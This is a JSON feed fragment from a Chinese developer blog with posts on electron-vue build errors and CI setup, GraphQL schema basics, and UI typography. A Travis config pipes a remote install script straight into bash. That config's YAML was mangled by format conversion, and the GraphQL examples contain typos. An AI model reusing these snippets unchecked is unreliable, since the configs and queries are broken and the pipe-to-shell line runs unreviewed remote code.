也就是说我们必须使用偶数的字号来设计。如: 文字使用宋体、大小为 12px、渲染方式选择无。稍大一些的字体使用微软雅黑、大小为 14-20px、渲染方式选择 Windows Lcd 或锐利。另外, 英文和数字需使用 Arial 字体, 渲染方式选择无。</p>\n<h2 id=\"文字排版八条定律\" tabindex=\"-1\"> 文字排版八条定律</h2>\n<ul>\n<li>第一, 保证文字是可读的。</li>\n<li>第二, 不要在一个版面中使用三种以上的字体。</li>\n<li>第三, 如果英文标题或单独进行排版时, 尽量全部使用大写而非首字母大写。中文标题或单独进行排版时结尾不需要句号。</li>\n<li>第四, 文字之间的间距在 UI 设计中一般设置为 0, 行距一般为字号本身的 1.5 倍到 2 倍。但是考虑到用户使用场景, 比如用户在地- 铁内阅读新闻时可能地铁会出现晃的情况而导致串行, 就需要我们考虑增加行距。总之字间距和行距以及文字大小都要依据实际场景来决定。在 UI 设计中文字大小单位须设置成 PX（像素）, 大小必须是偶数。如: 24px、26px、28px 等。</li>\n<li>第五, 文字阅读需要清晰地背景区分, 比如黑纸白字和白纸黑字原则。</li>\n<li>第六, 除非不得已尽量避免在一个版式中使用中英文混排。</li>\n<li>第七, 文本左边对齐同时右边也需要对齐。可以通过 PS 中的段落面板设置间距组合和避头尾法则, 但是有时半角符号可能会让我们很棘手, 那就要通过调整间距和空格等方式让文本尽量对齐。</li>\n<li>第八, 中文前面需要空两个全角字符空格, 英文前面无需空格, 但需要大写。</li>\n</ul>\n<h2 id=\"总结\" tabindex=\"-1\"> 总结</h2>\n<p>无论您面对的项目是 To C 的还是 To B 的网站产品, 我们都应该首先 <code>确立设计风格</code> &gt; <code>寻找设计素材</code> &gt; <code>建立情绪板</code> &gt; <code>完成视觉稿</code> &gt; <code>切图标注</code> &gt; <code>建立视觉规范</code> &gt; <code>进行项目走查</code> 如果设计一般网站的页面, 可以按照 1920 X 1080px 尺寸设计。每屏高度 900px, 字体使用宋体 12px、无和微软雅黑 14-20、Windows LCD。Banner 尽量满屏, 但是图片需要按照 4:3 或 16:9 等比例来设计。做网站时可以建立栅格以更好地进行自适应和响应式布局, 我们也要为超链接和按钮设计不同的相应鼠标的状态；另外我们也可以多多尝试在网站设计中加入视差滚动、雪碧图动画等好玩的交互。</p>\n<p>如果设计手机端的页面, 可以按照 750X1334PX 尺寸设计。字体使用苹方 24PX 以上、锐利。英文字体使用 SF UI。按钮和点击区域需要大于 88PX 方便手指点击。并且头部需要预留出微信或浏览器的导航区域。</p>\n",
      "image": "https://vxhly.github.io/assets/web-design-1.png",
      "date_published": "2019-08-08T10:07:37.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "design"
      ]
    },
    {
      "title": "初学 electron-vue",
      "url": "https://vxhly.github.io/views/electron/learn-electron-vue.html",
      "id": "https://vxhly.github.io/views/electron/learn-electron-vue.html",
      "summary": "前言\n记录学习 electron-vue 时遇到的一些坑, 从报错或者日常需求上出发找寻解决方案。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录学习 electron-vue 时遇到的一些坑, 从报错或者日常需求上出发找寻解决方案。</p>\n</div>\n\n<h2 id=\"坑一\" tabindex=\"-1\"> 坑一</h2>\n<p>一般的高版本的 node, 大于 12 的版本时候。初步运行 electron-vue 项目时候会报错！</p>\n<div><p>报错特征</p>\n<p>ERROR in Template execution failed: ReferenceError: process is not defined</p>\n<p>ERROR in ReferenceError: process is not defined</p>\n<ul>\n<li>\n<p>index.ejs:102</p>\n<p>/Users/codeman/github/my-project/src/index.ejs:102:2</p>\n</li>\n<li>\n<p>index.ejs:107 module.exports</p>\n<p>/Users/codeman/github/my-project/src/index.ejs:107:3</p>\n</li>\n<li>\n<p>index.js:284</p>\n<p>[my-project]/[html-webpack-plugin]/index.js:284:18</p>\n</li>\n</ul>\n</div>\n<h3 id=\"解决方案\" tabindex=\"-1\"> 解决方案</h3>\n<p>修改 <code>.electron-vue/webpack.renderer.config.js</code> 和 <code>.electron-vue/webpack.web.config.js</code> 如下：</p>\n<p><code>.electron-vue/webpack.renderer.config.js</code></p>\n<div><pre><code><span>new</span> <span>HtmlWebpackPlugin</span><span>(</span><span>{</span>\n  <span>filename</span><span>:</span> <span>\"index.html\"</span><span>,</span>\n  <span>template</span><span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"../src/index.ejs\"</span><span>)</span><span>,</span>\n  <span>minify</span><span>:</span> <span>{</span>\n    <span>collapseWhitespace</span><span>:</span> <span>true</span><span>,</span>\n    <span>removeAttributeQuotes</span><span>:</span> <span>true</span><span>,</span>\n    <span>removeComments</span><span>:</span> <span>true</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>templateParameters</span><span>(</span><span>compilation<span>,</span> assets<span>,</span> options</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>compilation</span><span>:</span> compilation<span>,</span>\n      <span>webpack</span><span>:</span> compilation<span>.</span><span>getStats</span><span>(</span><span>)</span><span>.</span><span>toJson</span><span>(</span><span>)</span><span>,</span>\n      <span>webpackConfig</span><span>:</span> compilation<span>.</span>options<span>,</span>\n      <span>htmlWebpackPlugin</span><span>:</span> <span>{</span>\n        <span>files</span><span>:</span> assets<span>,</span>\n        <span>options</span><span>:</span> options<span>,</span>\n      <span>}</span><span>,</span>\n      process<span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n  <span>nodeModules</span><span>:</span>\n    process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>!==</span> <span>\"production\"</span>\n      <span>?</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"../node_modules\"</span><span>)</span>\n      <span>:</span> <span>false</span><span>,</span>\n<span>}</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>.electron-vue/webpack.web.config.js</code></p>\n<div><pre><code><span>new</span> <span>HtmlWebpackPlugin</span><span>(</span><span>{</span>\n  <span>filename</span><span>:</span> <span>\"index.html\"</span><span>,</span>\n  <span>template</span><span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>\"../src/index.ejs\"</span><span>)</span><span>,</span>\n  <span>templateParameters</span><span>(</span><span>compilation<span>,</span> assets<span>,</span> options</span><span>)</span> <span>{</span>\n    <span>return</span> <span>{</span>\n      <span>compilation</span><span>:</span> compilation<span>,</span>\n      <span>webpack</span><span>:</span> compilation<span>.</span><span>getStats</span><span>(</span><span>)</span><span>.</span><span>toJson</span><span>(</span><span>)</span><span>,</span>\n      <span>webpackConfig</span><span>:</span> compilation<span>.</span>options<span>,</span>\n      <span>htmlWebpackPlugin</span><span>:</span> <span>{</span>\n        <span>files</span><span>:</span> assets<span>,</span>\n        <span>options</span><span>:</span> options<span>,</span>\n      <span>}</span><span>,</span>\n      process<span>,</span>\n    <span>}</span><span>;</span>\n  <span>}</span><span>,</span>\n  <span>minify</span><span>:</span> <span>{</span>\n    <span>collapseWhitespace</span><span>:</span> <span>true</span><span>,</span>\n    <span>removeAttributeQuotes</span><span>:</span> <span>true</span><span>,</span>\n    <span>removeComments</span><span>:</span> <span>true</span><span>,</span>\n  <span>}</span><span>,</span>\n  <span>nodeModules</span><span>:</span> <span>false</span><span>,</span>\n<span>}</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"坑二\" tabindex=\"-1\"> 坑二</h2>\n<p>在初步使用 <code>electron-builder</code> 编译 electron-vue 项目时候会报错（PS：一般出现在 MacOS 下）</p>\n<div><p>报错特征</p>\n<p>Error: Exit code: 2. Command failed: /usr/bin/perl /private/var/folders/mj/n34f_bp95zq2_1fwll3bq70m0000gn/T/t-51hskU/1-dmgProperties.pl Can't locate Mac/Memory.pm in @INC (you may need to install the Mac:: Memory module) (@INC contains: /Library/Perl/5.18/darwin-thread-multi-2level /Library/Perl/5.18 /Network/Library/Perl/5.18/darwin-thread-multi-2level /Network/Library/Perl/5.18 /Library/Perl/Updates/5.18.4 /System/Library/Perl/5.18/darwin-thread-multi-2level /System/Library/Perl/5.18 /System/Library/Perl/Extras/5.18/darwin-thread-multi-2level /System/Library/Perl/Extras/5.18 .) at /private/var/folders/mj/n34f_bp95zq2_1fwll3bq70m0000gn/T/t-51hskU/1-dmgProperties.pl line 4. BEGIN failed--compilation aborted at /private/var/folders/mj/n34f_bp95zq2_1fwll3bq70m0000gn/T/t-51hskU/1-dmgProperties.pl line 4.</p>\n</div>\n<h3 id=\"解决方案-1\" tabindex=\"-1\"> 解决方案</h3>\n<p>升级你的 <code>electron-builder</code> 依赖包</p>\n<div><pre><code><span>npm</span> <span>install</span> electron-builder@latest -D\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"坑三\" tabindex=\"-1\"> 坑三</h2>\n<p>默认项目配置的 sass/scss 编译器为 <code>node-sass</code> , 该编译器在 Windows 环境下及其的不友好, 所以这里比较推荐的是使用 <code>Dart Sass</code> , 有兴趣的小伙伴传送门在这里 <a href=\"/views/manual/usage-of-docker.html#%E6%8B%93%E5%B1%95-2\">为啥要用 Dart sass</a></p>\n<h3 id=\"解决方案-2\" tabindex=\"-1\"> 解决方案</h3>\n<p>删除你的原有的 <code>node-sass</code> 依赖项, <code>node-sass</code> 和 <code>Dart Sass</code> 几乎无缝转换, 所以不用担心兼容问题</p>\n<div><pre><code><span>npm</span> <span>install</span> sass -D\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"坑四\" tabindex=\"-1\"> 坑四</h2>\n<p>CI 自动编译时会报 <code>Node.js</code> 的版本过低, 导致编译错误, <code>Travis CI</code> 平台上的日志特征</p>\n<div><p>报错特征</p>\n<p>$ yarn yarn install v1.19.2 warning You are using Node &quot;7.10.1&quot; which is not supported and may encounter bugs or unexpected behavior. Yarn supports the following semver range: &quot;^4.8.0 || ^5.7.0 || ^6.2.2 || &gt;=8.0.0&quot; warning package.json: No license field warning demo@0.0.1: No license field [1/4] Resolving packages... [2/4] Fetching packages... error getmac@4.3.0: The engine &quot;node&quot; is incompatible with this module. Expected version &quot;&gt;=8&quot;. Got &quot;7.10.1&quot; error Found incompatible module. info Visit https://yarnpkg.com/en/docs/cli/install for documentation about this command. The command &quot;yarn&quot; failed and exited with 1 during . Your build has been stopped.</p>\n</div>\n<h3 id=\"解决方案-3\" tabindex=\"-1\"> 解决方案</h3>\n<p>建议在 <code>.travis.yml</code> 和 <code>appveyor.yml</code> 中修改 <code>Node.js</code> 的版本</p>\n<p><code>.travis.yml</code></p>\n<div><pre><code><span>osx_image</span><span>:</span> xcode8.3\n<span>sudo</span><span>:</span> required\n<span>dist</span><span>:</span> trusty\n<span>language</span><span>:</span> c\n<span>matrix</span><span>:</span>\n  <span>include</span><span>:</span>\n\n  <span>+ os</span><span>:</span> osx\n\n  <span># - os: linux</span>\n    <span>env</span><span>:</span> CC=clang CXX=clang++ npm_config_clang=1\n    <span>compiler</span><span>:</span> clang\n<span>cache</span><span>:</span>\n  <span>directories</span><span>:</span>\n\n  + node_modules\n  + \"$HOME/.electron\"\n  + \"$HOME/.cache\"\n\n<span>addons</span><span>:</span>\n  <span>apt</span><span>:</span>\n    <span>packages</span><span>:</span>\n\n    <span>-</span> libgnome<span>-</span>keyring<span>-</span>dev\n    <span>-</span> icnsutils\n\n<span>before_install</span><span>:</span>\n\n* mkdir <span>-</span>p /tmp/git<span>-</span>lfs <span>&amp;&amp;</span> curl <span>-</span>L https<span>:</span>//github.com/github/git<span>-</span>lfs/releases/download/v1.2.1/git<span>-</span>lfs<span>-</span>$(<span>[</span>\n\n  \"$TRAVIS_OS_NAME\" == \"linux\" <span>]</span> <span>&amp;&amp;</span> echo \"linux\" <span>|</span><span>|</span> echo \"darwin\")<span>-</span>amd64<span>-</span>1.2.1.tar.gz\n  <span>|</span> tar <span>-</span>xz <span>-</span>C /tmp/git<span>-</span>lfs <span>-</span><span>-</span>strip<span>-</span>components 1 <span>&amp;&amp;</span> /tmp/git<span>-</span>lfs/git<span>-</span>lfs pull\n\n* if <span>[</span><span>[</span> \"$TRAVIS_OS_NAME\" == \"linux\" <span>]</span><span>]</span>; then sudo apt<span>-</span>get install <span>-</span><span>-</span>no<span>-</span>install<span>-</span>recommends <span>-</span>y icnsutils graphicsmagick xz<span>-</span>utils; fi\n\n<span>install</span><span>:</span>\n\n* nvm install 12\n* curl <span>-</span>o<span>-</span> <span>-</span>L https<span>:</span>//yarnpkg.com/install.sh <span>|</span> bash\n* source ~/.bashrc\n* npm install <span>-</span>g xvfb<span>-</span>maybe\n* yarn install\n\n<span>script</span><span>:</span>\n\n* yarn run release\n\n<span>branches</span><span>:</span>\n  <span>only</span><span>:</span>\n\n  + master\n\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>appveyor.yml</code></p>\n<div><pre><code><span>version</span><span>:</span> 0.1.<span>{</span>build<span>}</span>\n\n<span>branches</span><span>:</span>\n  <span>only</span><span>:</span>\n\n    <span>-</span> master\n\n<span>image</span><span>:</span> Visual Studio 2017\n<span>platform</span><span>:</span>\n\n  + x64\n\n<span>cache</span><span>:</span>\n\n  + node_modules\n  + '%APPDATA%\\npm<span>-</span>cache'\n  + '%USERPROFILE%\\.electron'\n  + '%USERPROFILE%\\AppData\\Local\\Yarn\\cache'\n\n<span>init</span><span>:</span>\n\n  + git config <span>-</span><span>-</span>global core.autocrlf input\n\n<span>install</span><span>:</span>\n\n  <span>+ ps</span><span>:</span> Install<span>-</span>Product node 12 x64\n  + git reset <span>-</span><span>-</span>hard HEAD\n  + yarn install\n  + node <span>-</span><span>-</span>version\n\n<span>build_script</span><span>:</span>\n\n  + yarn run release\n\n<span>test</span><span>:</span> off\n\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"坑五\" tabindex=\"-1\"> 坑五</h2>\n<p>CI 自动编译成功但是并未成功发布到 GitHub 上, <code>Appveyor CI</code> 平台上的日志特征</p>\n<div><p>报错特征</p>\n<p>• publishing publisher=Github (owner: vxhly, project: demo, version: 0.0.1) • uploading file=demo-setup-0.0.1.exe.blockmap provider=GitHub • uploading file=demo-setup-0.0.1.exe provider=GitHub • skipped publishing file=demo-setup-0.0.1.exe.blockmap reason=release doesn't exist and not created because &quot;publish&quot; is not &quot;always&quot; and build is not on tag tag=v0.0.1 version=0.0.1 • skipped publishing file=demo-setup-0.0.1.exe reason=release doesn't exist and not created because &quot;publish&quot; is not &quot;always&quot; and build is not on tag tag=v0.0.1 version=0.0.1 • skipped publishing file=latest.yml reason=release doesn't exist and not created because &quot;publish&quot; is not &quot;always&quot; and build is not on tag tag=v0.0.1 version=0.0.1 Done in 128.39s. Updating build cache... Cache 'node_modules' - Updated Cache entry not found: C:\\Users\\appveyor\\AppData\\Roaming\\npm-cache Cache 'C:\\Users\\appveyor.electron' - Updated Cache 'C:\\Users\\appveyor\\AppData\\Local\\Yarn\\cache' - Updated Build success</p>\n</div>\n<h3 id=\"解决方案-4\" tabindex=\"-1\"> 解决方案</h3>\n<p>可能原因一：自带的 <code>npm run build</code> 这个脚本让 CI 去执行构建, 但是发现无法自动上传到 GitHub 的 release 里可能原因二：未发布 tag</p>\n<p>步骤一：在 <code>package.json</code> 中配置运行 <code>script</code></p>\n<div><pre><code><span>{</span>\n  <span>\"release\"</span><span>:</span> <span>\"node .electron-vue/build.js &amp;&amp; electron-builder\"</span><span>,</span>\n  <span>\"patch\"</span><span>:</span> <span>\"npm version patch &amp;&amp; git push origin master &amp;&amp; git push origin --tags\"</span><span>,</span>\n  <span>\"minor\"</span><span>:</span> <span>\"npm version minor &amp;&amp; git push origin master &amp;&amp; git push origin --tags\"</span><span>,</span>\n  <span>\"major\"</span><span>:</span> <span>\"npm version major &amp;&amp; git push origin master &amp;&amp; git push origin --tags\"</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>步骤二：修改 <code>.travis.yml</code> 和 <code>appveyor.yml</code> 文件（PS：在坑四中已体现, 这边就不重复了）</p>\n<h2 id=\"坑六\" tabindex=\"-1\"> 坑六</h2>\n<p>在 Windows 下打包之后, 未能正确的显示安装路径而是直接安装</p>\n<h3 id=\"解决方案-5\" tabindex=\"-1\"> 解决方案</h3>\n<p>在 <code>package.json</code> 中修改</p>\n<div><pre><code><span>{</span>\n  <span>\"build\"</span><span>:</span> <span>{</span>\n    <span>\"win\"</span><span>:</span> <span>{</span>\n      <span>\"icon\"</span><span>:</span> <span>\"build/icons/icon.ico\"</span><span>,</span>\n      <span>\"target\"</span><span>:</span> <span>[</span>\n        <span>{</span>\n          <span>\"target\"</span><span>:</span> <span>\"nsis\"</span><span>,</span>\n          <span>\"arch\"</span><span>:</span> <span>[</span><span>\"ia32\"</span><span>]</span>\n        <span>}</span>\n      <span>]</span>\n    <span>}</span><span>,</span>\n    <span>\"nsis\"</span><span>:</span> <span>{</span>\n      <span>\"oneClick\"</span><span>:</span> <span>false</span><span>,</span>\n      <span>\"allowElevation\"</span><span>:</span> <span>true</span><span>,</span>\n      <span>\"allowToChangeInstallationDirectory\"</span><span>:</span> <span>true</span><span>,</span>\n      <span>\"installerIcon\"</span><span>:</span> <span>\"build/icons/icon.ico\"</span><span>,</span>\n      <span>\"uninstallerIcon\"</span><span>:</span> <span>\"build/icons/icon.ico\"</span><span>,</span>\n      <span>\"installerHeaderIcon\"</span><span>:</span> <span>\"build/icons/icon.ico\"</span><span>,</span>\n      <span>\"createDesktopShortcut\"</span><span>:</span> <span>true</span><span>,</span>\n      <span>\"createStartMenuShortcut\"</span><span>:</span> <span>true</span><span>,</span>\n      <span>\"displayLanguageSelector\"</span><span>:</span> <span>true</span><span>,</span>\n      <span>\"multiLanguageInstaller\"</span><span>:</span> <span>true</span><span>,</span>\n      <span>\"installerLanguages\"</span><span>:</span> <span>[</span><span>\"en_US\"</span><span>,</span> <span>\"zh_CN\"</span><span>]</span><span>,</span>\n      <span>\"warningsAsErrors\"</span><span>:</span> <span>false</span>\n    <span>}</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"坑七\" tabindex=\"-1\"> 坑七</h2>\n<p><code>MacOS</code> 下打包未能正确识别到签名证书, 报错特征</p>\n<div><p>报错特征</p>\n<p>• electron-builder version=21.2.0 os=19.0.0 • loaded configuration file=package.json (&quot;build&quot; field) • writing effective config file=build/builder-effective-config.yaml • rebuilding native dependencies dependencies=grpc@1.24.2 platform=darwin arch=x64 • rebuilding native dependency name=grpc version=1.24.2 • packaging platform=darwin arch=x64 electron=2.0.18 appOutDir=build/mac • skipped macOS application code signing reason=cannot find valid &quot;Developer ID Application&quot; identity or custom non-Apple code signing certificate, see https://electron.build/code-signing allIdentities=</p>\n<pre><code>                                               0 identities found\n\n                                            Valid identities only\n                                               0 valid identities found\n</code></pre>\n</div>\n<h3 id=\"解决方案-6\" tabindex=\"-1\"> 解决方案</h3>\n<p>使用 <code>X-code</code> 进行 mac 版本上代码签名</p>\n<ol>\n<li>打开 xcode 主界面</li>\n<li>Xcode==&gt;Preferences…</li>\n</ol>\n<p><img src=\"/assets/electron-1.png\" alt=\"electron-mac\"></p>\n<ol start=\"3\">\n<li>Accounts==&gt;Apple IDs==&gt;Manage Certificates…, 如果没有登录的话, 先登录 Apple ID, 注意一定要登录开发者账号。登录成功后再进行 Manage Certificates；</li>\n</ol>\n<p><img src=\"/assets/electron-2.png\" alt=\"electron-mac\"></p>\n<ol start=\"4\">\n<li>添加“+”Developer ID Application,注意一定要添加 Developer ID Application 到钥匙串中, 不要选错了。</li>\n</ol>\n<p><img src=\"/assets/electron-3.png\" alt=\"electron-mac\"></p>\n<ol start=\"5\">\n<li>成功添加到钥匙串我的证书中, 经过以上的步骤可以成功添加一个证书到钥匙串中的我的证书中。</li>\n</ol>\n<p><img src=\"/assets/electron-4.png\" alt=\"electron-mac\"></p>\n<p><img src=\"/assets/electron-5.png\" alt=\"electron-mac\"></p>\n<ol start=\"6\">\n<li>正确签名之后, 打包成功！</li>\n</ol>\n",
      "image": "https://vxhly.github.io/assets/electron-1.png",
      "date_published": "2019-11-05T15:29:47.000Z",
      "date_modified": "2022-08-01T13:55:22.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "electron"
      ]
    },
    {
      "title": "graphql 学习",
      "url": "https://vxhly.github.io/views/graphql/learn-graphql.html",
      "id": "https://vxhly.github.io/views/graphql/learn-graphql.html",
      "summary": "前言\n记录 graphql 的学习笔记.\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录 graphql 的学习笔记.</p>\n</div>\n\n<h2 id=\"简介\" tabindex=\"-1\"> 简介</h2>\n<h2 id=\"schema-包含的类型\" tabindex=\"-1\"> Schema 包含的类型</h2>\n<ul>\n<li>\n<p><code>Scalar types</code></p>\n<div><p>提示</p>\n<ul>\n<li>下面的数据类型类似于我们平常使用的编程语言中的原始类型。</li>\n<li>需要定义非空类型时, 需要添加 <code>!</code>, 例如：<code>Int!</code></li>\n</ul>\n</div>\n<ul>\n<li><code>Int</code>：有符号 32 位整数。</li>\n<li><code>Float</code>：有符号双精度浮点值。</li>\n<li><code>String</code>：UTF‐8 字符序列。</li>\n<li><code>Boolean</code>： true 或者 false 。</li>\n<li><code>ID</code>：ID 标量类型表示一个唯一标识符, 通常用以重新获取对象或者作为缓存中的键。ID 类型使用和 String 一样的方式序列化；然而将其定义为 ID 意味着并不需要人类可读型。</li>\n</ul>\n</li>\n<li>\n<p><code>Object types</code></p>\n<div><p>提示</p>\n<p>一个对象类型包含一组字段, 每个字段可以是标量类型或另一种对象类型。</p>\n</div>\n<div><pre><code><span>type</span> <span>Book</span> <span>{</span>\n  <span>title</span><span>:</span> <span>String</span>\n  <span>author</span><span>:</span> <span>Author</span>\n<span>}</span>\n\n<span>type</span> <span>Author</span> <span>{</span>\n  <span>name</span><span>:</span> <span>String</span>\n  <span>books</span><span>:</span> <span>[</span><span>Book</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>\n<li>\n<p><code>The Query type</code></p>\n<div><p>提示</p>\n<ul>\n<li>定义客户端可以针对您的数据图执行哪些 GraphQL 读取操作。</li>\n<li>Query 类型的每个字段定义了不同支持查询的名称和返回类型。</li>\n</ul>\n</div>\n<div><pre><code><span>type</span> <span>Query</span> <span>{</span>\n  <span>getBooks</span><span>:</span> <span>[</span><span>Book</span><span>]</span> <span># => 当前 API 为 /api/books</span>\n  <span>getAuthors</span><span>:</span> <span>[</span><span>Author</span><span>]</span> <span># => 当前 API 为 /api/authors</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>执行查询一</p>\n</div>\n<div><pre><code><span>qurty</span> <span>{</span>\n  <span>getBooks</span> <span>{</span>\n    <span>title</span>\n  <span>}</span>\n\n  <span>getAuthors</span> <span>{</span>\n    <span>name</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>=&gt; 返回</p>\n<div><pre><code><span>{</span>\n  <span>\"data\"</span><span>:</span> <span>{</span>\n    <span>\"getBooks\"</span><span>:</span> <span>[</span>\n      <span>{</span>\n        <span>\"title\"</span><span>:</span> <span>\"\"</span>\n        <span>// ......</span>\n      <span>}</span>\n    <span>]</span><span>,</span>\n\n    <span>\"getAuthors\"</span><span>:</span> <span>[</span>\n      <span>{</span>\n        <span>\"nmae\"</span><span>:</span> <span>\"\"</span>\n        <span>// ......</span>\n      <span>}</span>\n    <span>]</span>\n\n    <span>// ......</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>执行查询二</p>\n</div>\n<div><pre><code><span>qurty</span> <span>{</span>\n  <span>getBooks</span> <span>{</span>\n    <span>title</span>\n    <span>author</span> <span>{</span>\n      <span>name</span>\n    <span>}</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>=&gt; 返回</p>\n<div><pre><code><span>{</span>\n  <span>\"data\"</span><span>:</span> <span>{</span>\n    <span>\"getBooks\"</span><span>:</span> <span>[</span>\n      <span>{</span>\n        <span>\"title\"</span><span>:</span> <span>\"\"</span><span>,</span>\n        <span>\"author\"</span><span>:</span> <span>{</span>\n          <span>\"name\"</span><span>:</span> <span>\"\"</span>\n        <span>}</span>\n        <span>// ......</span>\n      <span>}</span>\n    <span>]</span>\n\n    <span>// ......</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>\n<li>\n<p><code>The Mutation type</code></p>\n<div><p>提示</p>\n<ul>\n<li>定义支持的写操作。</li>\n<li>Mutation 类型的每个字段定义了不同突变的签名和返回类型。</li>\n</ul>\n</div>\n<div><pre><code><span>type</span> <span>Mutation</span> <span>{</span>\n  <span>addBook</span><span>(</span><span>title</span><span>:</span> <span>String</span><span>,</span> <span>author</span><span>:</span> <span>String</span><span>)</span><span>:</span> <span>Book</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>执行添加</p>\n</div>\n<div><pre><code><span>mutation</span> <span>{</span>\n  <span>addBook</span><span>(</span><span>title</span><span>:</span> <span>\"\"</span><span>,</span> <span>author</span><span>:</span> <span>\"\"</span><span>)</span> <span>{</span>\n    <span>title</span>\n    <span>author</span> <span>{</span>\n      <span>name</span>\n    <span>}</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>=&gt; 返回</p>\n<div><pre><code><span>{</span>\n  <span>\"data\"</span><span>:</span> <span>{</span>\n    <span>\"addBook\"</span><span>:</span> <span>[</span>\n      <span>{</span>\n        <span>\"title\"</span><span>:</span> <span>\"\"</span><span>,</span>\n        <span>\"author\"</span><span>:</span> <span>{</span>\n          <span>\"name\"</span><span>:</span> <span>\"\"</span>\n        <span>}</span>\n        <span>// ......</span>\n      <span>}</span>\n    <span>]</span>\n\n    <span>// ......</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>\n<li>\n<p><code>Input type</code></p>\n<div><p>提示</p>\n<ul>\n<li>允许您将对象作为参数传递给的特殊对象类型进行查询和突变。</li>\n<li>帮助保持操作签名清洁。</li>\n</ul>\n</div>\n<div><pre><code><span>type</span> <span>Mutation</span> <span>{</span>\n  <span>createPost</span><span>(</span><span>title</span><span>:</span> <span>String</span><span>,</span> <span>body</span><span>:</span> <span>String</span><span>,</span> <span>mediaUrls</span><span>:</span> <span>[</span><span>String</span><span>]</span><span>)</span><span>:</span> <span>Post</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p>输入类型</p>\n</div>\n<div><pre><code><span>type</span> <span>Mutation</span> <span>{</span>\n  <span>createPost</span><span>(</span><span>post</span><span>:</span> <span>PostAndMediaInput</span><span>)</span><span>:</span> <span>Post</span>\n<span>}</span>\n\n<span>input</span> <span>PostAndMediaInput</span> <span>{</span>\n  <span>title</span><span>:</span> <span>String</span>\n  <span>body</span><span>:</span> <span>String</span>\n  <span>mediaUrls</span><span>:</span> <span>[</span><span>String</span><span>]</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>\n</ul>\n",
      "date_published": "2021-06-11T15:41:21.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "graphql"
      ]
    },
    {
      "title": "JDK 的安装和环境变量的配置",
